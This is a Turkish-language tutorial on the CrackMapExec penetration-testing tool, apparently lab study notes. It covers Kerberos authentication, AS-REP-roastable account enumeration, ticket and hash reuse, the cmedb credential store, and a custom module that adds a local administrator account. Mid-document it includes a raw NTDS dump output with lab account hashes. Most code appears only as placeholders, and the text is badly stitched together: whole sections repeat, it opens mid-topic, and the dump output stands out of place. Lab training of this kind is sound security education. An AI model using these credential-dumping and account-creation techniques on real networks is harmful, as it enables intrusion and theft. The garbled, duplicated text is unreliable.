Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


 -p '' --ntds

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\DC01$:
SMB 172.16.10.3 445 DC01 [-] RemoteOperations
failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB 172.16.10.3 445 DC01 [+] Dumping the NTDS,
this could take a while so go grab a redbull...
SMB 172.16.10.3 445 DC01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901
973d9a344:::
SMB 172.16.10.3 445 DC01
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB 172.16.10.3 445 DC01
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2c6454dbf95abc7b0a543b90f6f96f
66:::
SMB 172.16.10.3 445 DC01
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
SMB 172.16.10.3 445 DC01
derek.walker:1103:aad3b435b51404eeaad3b435b51404ee:69cc8c83c56aeeb7571bbee
c20c6ef65:::
SMB 172.16.10.3 445 DC01
carole.holmes:1104:aad3b435b51404eeaad3b435b51404ee:37ef72fcf42a4021948c7e
d7b33ccf21:::
SMB 172.16.10.3 445 DC01
callum.dixon:1105:aad3b435b51404eeaad3b435b51404ee:3e7c48255206470a13543b2
7b7af18de:::
SMB 172.16.10.3 445 DC01
beth.richards:1106:aad3b435b51404eeaad3b435b51404ee:de3d16603d7ded97bb47cd
6641b1a392:::
SMB 172.16.10.3 445 DC01
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
c0:::
SMB 172.16.10.3 445 DC01
WS01$:1601:aad3b435b51404eeaad3b435b51404ee:ee7c60ba01f7d361ad5479c86d3ab3
fc:::
SMB 172.16.10.3 445 DC01 [+] Dumped 10 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.10.3_2022-12-
09_065546.ntds of which 8 were added to the database
SMB 172.16.10.3 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.10.3 445 DC01 [*] cat

/home/plaintext/.cme/logs/DC01_172.16.10.3_2022-12-09_065546.ntds | grep -
iv disabled | cut -d ':' -f1
```


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

